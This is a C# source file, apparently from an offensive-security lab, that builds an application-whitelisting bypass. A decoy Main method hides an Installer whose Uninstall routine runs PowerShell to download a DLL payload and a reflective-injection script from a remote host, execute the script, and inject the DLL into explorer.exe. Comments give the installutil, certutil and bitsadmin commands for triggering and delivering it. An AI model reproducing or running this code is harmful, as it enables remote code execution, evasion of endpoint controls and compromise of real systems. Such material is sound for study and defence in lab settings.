using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install; //From Add References
namespace Bypass
{
	class Program{
	static void Main(string[] args){
		Console.WriteLine("This is the main method which is a decoy");
		}
	}
		[System.ComponentModel.RunInstaller(true)]
		public class Sample : System.Configuration.Install.Installer{
		public override void Uninstall(System.Collections.IDictionary savedState){
		String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
		Runspace rs = RunspaceFactory.CreateRunspace();
		rs.Open();
		PowerShell ps = PowerShell.Create();
		ps.Runspace = rs;
		ps.AddScript(cmd);
		ps.Invoke();
		rs.Close();
		}
	}
}

//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe

//certutil -encode C:\Users\Offsec\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt

//bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\Users\student\enc.txt

//certutil -decode enc.txt Bypass.exe
